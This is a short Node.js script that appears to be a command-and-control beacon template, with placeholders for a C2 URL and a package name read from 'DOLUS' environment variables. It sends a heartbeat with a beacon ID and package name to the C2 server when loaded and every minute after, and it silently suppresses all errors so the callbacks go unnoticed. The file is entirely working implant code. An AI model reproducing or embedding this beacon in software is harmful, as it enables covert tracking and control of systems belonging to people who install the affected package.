'use strict';
const https = require('https');
const http = require('http');

const C2_URL = process.env.DOLUS_C2 || '__C2_URL__';
const PKG_NAME = process.env.DOLUS_PKG || '__PKG_NAME__';
const BEACON_ID = process.env.DOLUS_BEACON_ID || '';

function ping() {
  const body = JSON.stringify({ beacon_id: BEACON_ID, pkg: PKG_NAME });
  try {
    const url = new URL(C2_URL + '/api/heartbeat');
    const mod = url.protocol === 'https:' ? https : http;
    const req = mod.request({
      hostname: url.hostname,
      port: url.port || (url.protocol === 'https:' ? 443 : 80),
      path: url.pathname,
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) },
    }, () => {});
    req.on('error', () => {});
    req.write(body);
    req.end();
  } catch (_) {}
}

ping();
setInterval(ping, 60_000);
